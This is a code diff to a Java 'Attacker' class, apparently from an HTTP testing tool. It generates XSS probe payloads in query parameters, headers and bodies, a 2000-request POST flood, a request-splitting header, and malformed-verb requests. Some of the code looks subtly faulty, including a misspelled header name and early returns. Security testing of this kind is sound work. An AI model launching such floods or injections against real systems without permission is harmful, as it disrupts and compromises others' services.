@@ -14,6 +14,7 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 public class Attacker {
+    private String script = "<script>alert(1)</script>";
     private List<Rule> rules;
     private List<Rule> attackRules;
 
@@ -23,12 +24,31 @@ public class Attacker {
         this.rules.addAll(rules);
     }
 
-    public void XSSAttack() {
+    public void attack() {
+        for(Rule rule: attackRules) {
+            new OutputRequest((OutInRule) rule).start();
+        }
+    }
+
+    public void XSSAttacks() {
+        XSSQueryParams();
+        XSSHeaders();
+        XSSBody();
+    }
+
+    private void XSSQueryParams() {
         Pattern pattern = Pattern.compile("(.*\\?)([^=]*=.*)");
         Matcher matcher;
         String[] params;
+        String path;
         Map<String,String> paramMap = new LinkedHashMap<>();
+        Set<Map.Entry<String, String>> paramSet;
+        Iterator<Map.Entry<String, String>> it;
         for(Rule rule: rules) {
+            paramMap.clear();
+            if(rule instanceof InOutRule) {
+                continue;
+            }
             matcher = pattern.matcher(rule.getRequest().getPath());
             if(matcher.find()) {
                 params = matcher.group(2).split("&");
@@ -36,16 +56,43 @@ public class Attacker {
             for(String param: params) {
                 paramMap.put(param.split("=")[0],"");
             }
-            String script = "<script>alert(\"XSS\")</script>";
-            Set<Map.Entry<String, String>> paramSet = paramMap.entrySet();
-            Iterator<Map.Entry<String, String>> it = paramSet.iterator();
-            String path = matcher.group(1);
+            paramSet = paramMap.entrySet();
+            it = paramSet.iterator();
+            path = matcher.group(1);
             while(it.hasNext()) {
                 Map.Entry<String, String> e = it.next();
-                path = path.concat(e.getKey() + "=" + script + "&");
+                path = path.concat(e.getKey() + "=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E&");
             }
             path = path.substring(0,path.length()-1);
             attackRules.add(new OutInRule(new Request(rule.getRequest().getMethod(),path,rule.getRequest().getHeaders(),rule.getRequest().getBody()), null, 0L, 1, 0L));
+        }
+    }
+
+    private void XSSHeaders() {
+        Map<String, String> headersMap = new HashMap<>();
+        for(Rule rule: rules) {
+            if (rule instanceof InOutRule) {
+                continue;
+            }
+            if (rule.getRequest().getHeaders().size() != 0) {
+                for (String k : rule.getRequest().getHeaders().keySet()) {
+                    headersMap.put(k, script);
+                }
+                attackRules.add(new OutInRule(new Request(rule.getRequest().getMethod(), rule.getRequest().getPath(), headersMap, rule.getRequest().getBody()), null, 0L, 1, 0L));
+            } else return;
+        }
+    }
+
+    private void XSSBody() {
+        for(Rule rule: rules) {
+            if(rule instanceof InOutRule) {
+                continue;
+            }
+            String body = rule.getRequest().getBody();
+            if(!body.equals("")){
+                body = script;
+                attackRules.add(new OutInRule(new Request(rule.getRequest().getMethod(), rule.getRequest().getPath(), rule.getRequest().getHeaders(), body), null, 0L, 1, 0L));
+            } else return;
         }
     }
 
@@ -75,7 +122,7 @@ public class Attacker {
         return sbContent.toString();
     }
 
-    public List<String> getIpAddresses() {
+    private List<String> getIpAddresses() {
         List<String> ipAddresses = new ArrayList<>();
         for (Rule rule : rules) {
             if (rule instanceof InOutRule) {
@@ -97,16 +144,13 @@ public class Attacker {
             generateBigFile();
             content = readFile(bigFile);
         }
-
         for (String ipAddress : getIpAddresses()) {
-            OutInRule httpFloodRule = new OutInRule(new Request("POST", ipAddress, null, content),
-                    null, 0L, 2000, 0L);
-            attackRules.add(httpFloodRule);
+            attackRules.add(new OutInRule(new Request("POST", ipAddress, null, content), null, 0L, 2000, 0L));
         }
     }
 
     public void requestSplittingAttack() throws URISyntaxException {
-        Map<String, String> headers = null;
+        Map<String, String> headers = new HashMap<>();
         headers.put("Transfert-Encoding", "chunked\r\n\r\n0\r\n\r\n");
         for (String ipAddress : getIpAddresses()) {
             Request reqToInject = new Request("POST", ipAddress, null, "HTTP Request Splitting Attack");
@@ -114,10 +158,7 @@ public class Attacker {
                     .method(reqToInject.getMethod(), HttpRequest.BodyPublishers.ofString(reqToInject.getBody()))
                     .uri(new URI(reqToInject.getPath()));
             String encodedReq = builder.build().toString();
-
-            OutInRule reqSplittingRule = new OutInRule(new Request("POST", ipAddress, headers, encodedReq),
-                    null, 0L, 1, null);
-            attackRules.add(reqSplittingRule);
+            attackRules.add(new OutInRule(new Request("POST", ipAddress, headers, encodedReq), null, 0L, 1, null));
         }
     }
 
@@ -128,29 +169,23 @@ public class Attacker {
         specialChar();
     }
 
-    public void verbNotExist() {
+    private void verbNotExist() {
         for (String ipAddress : getIpAddresses()) {
-            OutInRule wrongVerbRule = new OutInRule(new Request("wrongVerb", ipAddress, null, null),
-                    null, 0L, 1, null);
-            attackRules.add(wrongVerbRule);
+            attackRules.add(new OutInRule(new Request("wrongVerb", ipAddress, null, null), null, 0L, 1, null));
         }
     }
 
-    public void emptyVerb() {
+    private void emptyVerb() {
         for (String ipAddress : getIpAddresses()) {
-            OutInRule emptyVerbRule = new OutInRule(new Request("", ipAddress, null, null), null,
-                    0L, 1, null);
-            attackRules.add(emptyVerbRule);
+            attackRules.add(new OutInRule(new Request("", ipAddress, null, null), null, 0L, 1, null));
         }
     }
 
-    public void specialChar() {
-        Map<String, String> headers = null;
+    private void specialChar() {
+        Map<String, String> headers = new HashMap<>();
         headers.put("~`^@=+*", "$€£¤ø");
         for (String ipAddress : getIpAddresses()) {
-            OutInRule specialCharRule = new OutInRule(new Request("&'ƒ#%Šµ", ipAddress, headers, null), null,
-                    0L, 1, null);
-            attackRules.add(specialCharRule);
+            attackRules.add(new OutInRule(new Request("&'ƒ#%Šµ", ipAddress, headers, null), null, 0L, 1, null));
         }
     }
 }
